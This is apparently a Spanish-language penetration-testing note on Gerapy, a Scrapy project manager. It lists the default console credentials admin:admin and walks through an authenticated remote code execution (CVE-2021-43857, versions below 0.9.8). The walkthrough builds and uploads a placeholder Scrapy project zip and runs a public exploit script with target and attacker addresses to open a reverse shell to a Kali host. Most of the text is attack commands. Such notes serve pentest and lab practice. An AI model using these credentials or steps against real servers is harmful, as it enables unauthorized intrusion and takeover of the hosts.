# Gerapy 

Tags: #Gerapy #Scrapy 

Gerapy es un marco de trabajo web y de código abierto creado en Python que sirve para administrar, desplegar, programar y controlar de forma visual proyectos de extracción de datos web (web scraping) construidos con Scrapy y Scrapyd.

```bash 
# Credenciales por defecto para la consola 
	admin:admin 
```

## RCE (Autenticado) - Versión < 0.9.8

* [CVE-2021-43857](https://www.exploit-db.com/exploits/50640)

```bash
Paso 1:
Crear un proyecto 'Scrapy comprimido' en Kali

# Crea la estructura de Scrapy
mkdir -p exploit_project/exploit_project/spiders
cd exploit_project

touch exploit_project/__init__.py
touch exploit_project/spiders/__init__.py

cat > scrapy.cfg <<'EOF'
[settings]
default = exploit_project.settings
EOF

cat > exploit_project/settings.py <<'EOF'
BOT_NAME = "exploit_project"

SPIDER_MODULES = ["exploit_project.spiders"]
NEWSPIDER_MODULE = "exploit_project.spiders"

ROBOTSTXT_OBEY = False
EOF

# Comprimir todo
❯ cd /tmp
❯ zip -r exploit_project.zip exploit_project

Paso 2:
En la consola ir a 'Projects' dar click en 'Create > Upload (seleccionar archivo .zip) > Finish'
```

```bash 
Paso 3:
# Ejecutar el exploit para obtener la revershell 
❯ python3 50640.py -t IP_Server -p 8000 -L IP_Kali -P 9001      

NOTA:
	- Se necesitan las creds para la autenticación y que exista un projecto
```